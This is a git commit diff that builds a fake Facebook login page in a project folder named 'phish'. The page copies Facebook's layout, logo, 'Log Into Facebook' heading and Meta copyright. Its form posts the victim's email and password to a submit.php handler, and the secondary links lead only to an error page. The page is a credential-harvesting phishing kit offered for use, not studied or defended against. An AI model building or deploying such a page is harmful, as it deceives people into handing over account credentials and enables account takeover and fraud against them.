c43b70d566326e3691c1edcb5a192fbf64a8bc6b
Itsjustme27 <reachprayush@gmail.com>
2025-05-14 22:07:23 +0545

    fake facebook login page

--- phish/public/index.php
+++ phish/public/index.php
@@ -1,15 +1,90 @@
 <!-- phish/public/index.php -->
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Login</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
-    <h2>Sign in to Your Account</h2>
-    <form action="submit.php" method="POST">
-        <input type="text" name="username" placeholder="Email" required><br><br>
-        <input type="password" name="password" placeholder="Password" required><br><br>
-        <input type="submit" value="Login">
-    </form>
+    <div class="globalContainer">
+        <div class="fb_content d-flex justify-content-center align-items-center">
+            <div>
+                <div class="_8esj">
+                    <div class="_82esk">
+                        <div class="_8esl">
+                            <div class="_8ice d-flex justify-content-center">
+                                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"
+                                    class="fb_logo">
+                            </div>
+                        </div>
+                        <div class="_8esn d-flex justify-content-center mt-3">
+                            <div class="_61uv mt-3 w-100 p-3">
+                                <div class="_61tx d-flex justify-content-center fs-5 mb-4">
+                                    Log Into Facebook
+                                </div>
+                                <form action="submit.php" method="POST">
+                                    <div class="_61ux m-2">
+                                        <input class="form-control form-control-lg w-100" type="email" name="email" placeholder="Email"
+                                            placeholder="Email or phone number" required><br>
+                                    </div>
+                                    <div class="_61uy m-2">
+                                        <input class="form-control form-control-lg w-100" type="password" name="password" placeholder="Password" required><br>
+                                    </div>
+                                    <div class="_6ltj">
+                                        <input class="login btn btn-primary w-100" type="submit" value="Log In">
+                                    </div>
+                                    <div class="_6ltk d-flex justify-content-center mt-3">
+                                        <a href="error.html" class="text-decoration-none mb-3">Forgot account?</a>
+                                    </div>
+                                    <div class="_8icj d-flex align-items-center">
+                                        <div class="line"></div>
+                                        <div class="text">or</div>
+                                        <div class="line"></div>
+                                    </div>
+                                    <div class="_6ltg d-flex justify-content-center mt-3">
+                                        <a href="error.html" role="button" class="create btn btn-success fs-5">Create new account</a>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="_95ke footer-fluid d-flex justify-content-center h-100 mb-0">
+            <div class="pageFooter">
+                <ul class="uiList list-unstyled d-flex m-2 gap-2">
+                    <li>English (US)</li>
+                    <li>नेपाली</li>
+                    <li>Español</li>
+                    <li>Português (Brasil)</li>
+                    <li>日本語</li>
+                    <li>Français (France)</li>
+                    <li>Deutsch</li>
+                    <li>Italiano</li>
+                    <li>العربية</li>
+                    <li>中文(简体)</li>
+                </ul>
+                <hr>
+                <div class="copyright m-2">
+                    <div>
+                        <span> Meta © 2025</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-j1CDi7MgGQ12Z7Qab0qlWQ/Qqz24Gc6BM0thvEMVjHnfYGF0rmFCozFSxQBxwHKO"
+        crossorigin="anonymous"></script>
 </body>
+
 </html>
